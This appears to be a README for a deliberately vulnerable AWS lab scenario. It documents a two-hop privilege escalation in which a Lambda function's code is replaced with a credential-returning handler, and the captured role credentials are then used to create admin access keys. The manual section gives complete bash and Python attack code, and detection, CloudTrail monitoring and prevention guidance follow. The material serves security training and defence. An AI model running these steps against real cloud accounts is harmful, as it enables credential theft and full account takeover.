# Multi-Hop Privilege Escalation via Lambda Code Update and CreateAccessKey

* **Category:** Privilege Escalation
* **Path Type:** multi-hop
* **Target:** to-admin
* **Environments:** prod
* **Pathfinding.cloud ID:** lambda-004 + iam-002
* **Technique:** Update Lambda function code to exfiltrate execution role credentials, then use those credentials to create access keys for an admin user

## Overview

This scenario demonstrates a sophisticated two-hop privilege escalation attack that chains two distinct techniques: Lambda function code manipulation and IAM access key creation. The attack exploits the common misconfiguration where users are granted permissions to update Lambda function code without restrictions, combined with Lambda execution roles that have overly permissive IAM capabilities.

In the first hop, an attacker with `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` permissions modifies an existing Lambda function to exfiltrate the function's execution role credentials. When Lambda functions execute, they receive temporary credentials for their assigned IAM role through the instance metadata service. By injecting malicious code that returns these credentials, the attacker can capture the Lambda role's identity and permissions.

The second hop leverages the exfiltrated Lambda role credentials, which have `iam:CreateAccessKey` permission on an administrative user. This is a dangerous combination because Lambda execution roles are often granted broad permissions for automation purposes, and the ability to create access keys for admin users provides persistent, full administrative access. This attack chain demonstrates how seemingly limited permissions can be combined to achieve complete environment compromise.

## Understanding the attack scenario

### Principals in the attack path

- `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-lambda-004-to-iam-002-starting-user` (Starting user with Lambda update and invoke permissions)
- `arn:aws:lambda:REGION:PROD_ACCOUNT:function:pl-prod-lambda-004-to-iam-002-target-function` (Target Lambda function that will be modified)
- `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-lambda-004-to-iam-002-lambda-role` (Lambda execution role with iam:CreateAccessKey permission)
- `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-lambda-004-to-iam-002-admin-user` (Target admin user with AdministratorAccess)

### Attack Path Diagram

```mermaid
graph LR
    A[pl-prod-lambda-004-to-iam-002-starting-user] -->|lambda:UpdateFunctionCode| B[pl-prod-lambda-004-to-iam-002-target-function]
    B -->|lambda:InvokeFunction| C[Exfiltrate Credentials]
    C -->|Credentials| D[pl-prod-lambda-004-to-iam-002-lambda-role]
    D -->|iam:CreateAccessKey| E[pl-prod-lambda-004-to-iam-002-admin-user]
    E -->|Administrator Access| F[Effective Administrator]

    style A fill:#ff9999,stroke:#333,stroke-width:2px
    style B fill:#ffcc99,stroke:#333,stroke-width:2px
    style C fill:#ffcc99,stroke:#333,stroke-width:2px
    style D fill:#ffcc99,stroke:#333,stroke-width:2px
    style E fill:#ffcc99,stroke:#333,stroke-width:2px
    style F fill:#99ff99,stroke:#333,stroke-width:2px
```



### Attack Steps

1. **Initial Access**: Start as `pl-prod-lambda-004-to-iam-002-starting-user` (credentials provided via Terraform outputs)

2. **Reconnaissance** (optional): Use `lambda:ListFunctions` and `lambda:GetFunction` to identify the target Lambda function and understand its configuration

3. **Hop 1 - Update Lambda Code**: Use `lambda:UpdateFunctionCode` to replace the Lambda function's code with malicious code that extracts and returns the execution role's AWS credentials from environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`)

4. **Hop 1 - Invoke Lambda**: Use `lambda:InvokeFunction` to execute the modified function and capture the Lambda execution role's temporary credentials from the response

5. **Hop 2 - Create Admin Access Keys**: Using the exfiltrated Lambda role credentials, call `iam:CreateAccessKey` to generate permanent access keys for the admin user `pl-prod-lambda-004-to-iam-002-admin-user`

6. **Verification**: Configure AWS CLI with the newly created admin credentials and verify administrative access by performing privileged operations (e.g., `iam:ListUsers`)

### Scenario specific resources created

| ARN | Purpose |
| -- | -- |
| `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-lambda-004-to-iam-002-starting-user` | Scenario-specific starting user with lambda:UpdateFunctionCode and lambda:InvokeFunction permissions |
| `arn:aws:lambda:REGION:PROD_ACCOUNT:function:pl-prod-lambda-004-to-iam-002-target-function` | Lambda function that will be modified during the attack |
| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-lambda-004-to-iam-002-lambda-role` | Lambda execution role with iam:CreateAccessKey permission on the admin user |
| `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-lambda-004-to-iam-002-admin-user` | Target admin user with AdministratorAccess managed policy attached |
| `arn:aws:iam::PROD_ACCOUNT:policy/pl-prod-lambda-004-to-iam-002-starting-policy` | Policy granting starting user Lambda permissions |
| `arn:aws:iam::PROD_ACCOUNT:policy/pl-prod-lambda-004-to-iam-002-lambda-policy` | Policy granting Lambda role iam:CreateAccessKey on admin user |

## Executing the attack

### Using the automated demo_attack.sh

To demonstrate the privilege escalation path, run the provided demo script:

```bash
cd modules/scenarios/single-account/privesc-multi-hop/to-admin/lambda-004-to-iam-002-to-admin
./demo_attack.sh
```

The script will:
1. Display a step-by-step walkthrough with color-coded output
2. Show the commands being executed and their results
3. Update the Lambda function with credential-exfiltration code
4. Invoke the function and capture the Lambda role credentials
5. Use those credentials to create access keys for the admin user
6. Verify successful privilege escalation to administrator
7. Output standardized test results for automation

### Manual attack execution

If you prefer to execute the attack manually:

```bash
# Step 1: Configure starting user credentials
export AWS_ACCESS_KEY_ID="<starting_user_access_key>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_key>"
unset AWS_SESSION_TOKEN

# Step 2: Create malicious Lambda code (credential exfiltrator)
cat > /tmp/lambda_payload.py << 'EOF'
import os
import json

def lambda_handler(event, context):
    return {
        'statusCode': 200,
        'body': json.dumps({
            'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID'),
            'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY'),
            'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN')
        })
    }
EOF

# Step 3: Package and update the Lambda function
cd /tmp && zip lambda_payload.zip lambda_payload.py
aws lambda update-function-code \
    --function-name pl-prod-lambda-004-to-iam-002-target-function \
    --zip-file fileb://lambda_payload.zip

# Step 4: Invoke the function to get Lambda role credentials
LAMBDA_RESPONSE=$(aws lambda invoke \
    --function-name pl-prod-lambda-004-to-iam-002-target-function \
    --payload '{}' \
    /tmp/response.json)
LAMBDA_CREDS=$(cat /tmp/response.json | jq -r '.body' | jq -r '.')

# Step 5: Extract and use Lambda role credentials
export AWS_ACCESS_KEY_ID=$(echo $LAMBDA_CREDS | jq -r '.AWS_ACCESS_KEY_ID')
export AWS_SECRET_ACCESS_KEY=$(echo $LAMBDA_CREDS | jq -r '.AWS_SECRET_ACCESS_KEY')
export AWS_SESSION_TOKEN=$(echo $LAMBDA_CREDS | jq -r '.AWS_SESSION_TOKEN')

# Step 6: Create access keys for admin user
ADMIN_KEYS=$(aws iam create-access-key \
    --user-name pl-prod-lambda-004-to-iam-002-admin-user)

# Step 7: Use admin credentials
export AWS_ACCESS_KEY_ID=$(echo $ADMIN_KEYS | jq -r '.AccessKey.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_KEYS | jq -r '.AccessKey.SecretAccessKey')
unset AWS_SESSION_TOKEN

# Step 8: Verify admin access
aws iam list-users
```

### Cleaning up the attack artifacts

After demonstrating the attack, clean up the access keys and restore the original Lambda code:

```bash
cd modules/scenarios/single-account/privesc-multi-hop/to-admin/lambda-004-to-iam-002-to-admin
./cleanup_attack.sh
```

The cleanup script will:
1. Delete any access keys created for the admin user during the demo
2. Restore the Lambda function to its original benign code
3. Remove temporary files created during the attack
4. Preserve the deployed infrastructure for future demonstrations

## Detection and prevention

### What CSPM tools should detect

A properly configured Cloud Security Posture Management tool should identify the following risks in this scenario:

**High Severity Findings:**
- IAM user has `lambda:UpdateFunctionCode` permission - allows code injection
- IAM user has `lambda:InvokeFunction` permission combined with code update - enables credential exfiltration
- Lambda execution role has `iam:CreateAccessKey` permission - dangerous for automation roles
- Lambda role can create credentials for user with AdministratorAccess
- Multi-hop privilege escalation path from starting user to administrator

**Medium Severity Findings:**
- Lambda function exists that could be modified by non-admin users
- IAM user with administrative access exists (potential target)
- Lambda execution role has IAM permissions beyond its operational needs

**Attack Path Detection:**
- Path: `starting-user` -> `lambda:UpdateFunctionCode` -> `lambda:InvokeFunction` -> `lambda-role` -> `iam:CreateAccessKey` -> `admin-user`
- Risk: Complete environment compromise through chained privilege escalation

### CloudTrail events to monitor

| Event Name | Description | Severity |
| -- | -- | -- |
| `UpdateFunctionCode20150331v2` | Lambda function code was modified | High |
| `Invoke` | Lambda function was invoked (correlate with code changes) | Medium |
| `CreateAccessKey` | New access keys created (especially for privileged users) | Critical |

### Detection queries

**AWS CloudTrail Lake query for suspicious Lambda + IAM activity:**
```sql
SELECT
    eventTime, eventName, userIdentity.arn, requestParameters
FROM cloudtrail_logs
WHERE eventName IN ('UpdateFunctionCode20150331v2', 'Invoke', 'CreateAccessKey')
    AND eventTime > date_sub(current_date, 1)
ORDER BY eventTime
```

### MITRE ATT&CK Mapping

- **Tactics**:
  - TA0004 - Privilege Escalation
  - TA0002 - Execution
  - TA0006 - Credential Access
- **Techniques**:
  - T1098.001 - Account Manipulation: Additional Cloud Credentials
  - T1059 - Command and Scripting Interpreter
  - T1552.005 - Unsecured Credentials: Cloud Instance Metadata API

## Prevention recommendations

- **Restrict Lambda code update permissions**: Implement resource-based conditions to limit which functions can be updated: `"Condition": {"StringNotLike": {"lambda:FunctionArn": "arn:aws:lambda:*:*:function:production-*"}}`

- **Separate Lambda invoke and update permissions**: Avoid granting both `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` to the same principal - this combination enables credential exfiltration

- **Apply least privilege to Lambda execution roles**: Lambda roles should only have permissions required for their specific function, never `iam:CreateAccessKey` or other IAM credential-management permissions

- **Use permission boundaries on Lambda roles**: Apply permission boundaries that explicitly deny sensitive IAM actions like `iam:CreateAccessKey`, `iam:CreateLoginProfile`, and `iam:UpdateAssumeRolePolicy`

- **Implement SCPs for Lambda roles**: Organization-level SCPs can prevent Lambda execution roles from performing IAM credential operations regardless of their attached policies

- **Monitor for Lambda code changes**: Set up CloudWatch Events/EventBridge rules to alert on `UpdateFunctionCode` API calls, especially for sensitive functions

- **Enable Lambda function code signing**: Use AWS Signer to require that Lambda code be signed by trusted publishers, preventing unauthorized code modifications

- **Use IAM roles instead of IAM users for admin access**: Administrative principals should use roles with temporary credentials, not users with permanent access keys that can be created by attackers

- **Implement anomaly detection**: Use GuardDuty and CloudTrail Insights to detect unusual patterns like Lambda code updates followed by immediate invocations

## References

- [pathfinding.cloud - lambda-004](https://pathfinding.cloud/paths/lambda-004) - Lambda UpdateFunctionCode + InvokeFunction privilege escalation
- [pathfinding.cloud - iam-002](https://pathfinding.cloud/paths/iam-002) - IAM CreateAccessKey privilege escalation
- [MITRE ATT&CK T1098.001](https://attack.mitre.org/techniques/T1098/001/) - Account Manipulation: Additional Cloud Credentials
- [MITRE ATT&CK T1059](https://attack.mitre.org/techniques/T1059/) - Command and Scripting Interpreter
- [AWS Lambda Execution Role](https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html) - AWS documentation on Lambda execution roles
- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html) - Least privilege and access management
